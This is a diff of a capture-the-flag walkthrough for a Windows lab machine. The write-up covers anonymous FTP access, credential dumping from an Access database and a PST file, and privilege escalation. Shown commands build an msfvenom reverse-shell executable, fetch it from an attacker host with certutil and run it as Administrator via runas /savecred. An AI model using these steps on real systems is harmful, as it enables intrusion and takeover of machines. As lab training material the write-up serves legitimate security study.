@@ -8,6 +8,7 @@ location: default
 
 **Machine Information**
 
+	Difficulty : Easy
 	IP : 10.10.10.98
 	OS : Windows
 
@@ -44,7 +45,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 **FTP**
 
-An FTP server is running on port 21 and we can sign in as an anonymous user.
+An FTP server is running on port `21` and we can sign in as an anonymous user.
 
 ```
 ftp 10.10.10.98
@@ -97,6 +98,8 @@ From the output there is a table called `auth_user` that could be useful. Dumpin
 mdb-json backup.mdb auth_user
 ```
 
+There are three sets of credentials with one that is useful to us.
+
 ```json
 {"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
 {"id":27,"username":"engineer","password":"REDACTED","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
@@ -116,12 +119,6 @@ readpst 'Access Control.pst'
 ```
 
 Open this email to find the credentials for the `security` account.
-
-```
-...
-The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
-...
-```
 
 **Telnet**
 
@@ -171,21 +168,19 @@ We can impersonate the `Administrator` using their stored credentials to gain ac
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe > shelly.exe
 ```
 
-Upload the payload to the target machine.
+Start a new python server.
 
 ```
 python -m http.server 80
 ```
+
+Upload the payload to the target machine.
 
 ```
 certutil -urlcache -split -f http://10.10.14.4/shelly.exe shelly.exe
 ```
 
 Start a `netcat` listener on our attack machine. Once listening we can run this executable as the `Administrator` user with the `runas` command to gain a shell with elevated privileges.
-
-```
-rlwrap nc -nvlp 9001
-```
 
 ```
 runas /savecred /user:ACCESS\Administrator "C:\Users\security\shelly.exe"
